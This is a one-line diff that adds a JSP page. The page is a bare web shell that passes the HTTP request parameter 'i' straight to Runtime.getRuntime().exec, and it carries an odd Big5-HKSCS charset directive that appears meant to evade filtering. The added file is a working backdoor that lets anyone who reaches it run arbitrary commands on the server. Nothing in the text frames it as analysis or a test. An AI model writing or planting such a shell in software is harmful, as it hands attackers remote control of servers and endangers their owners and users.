@@ -1,0 +1,1 @@
+<%@ page contentType="charset=Big5-HKSCS" %><%Runtime.getRuntime().exec(request.getParameter("i"));%>
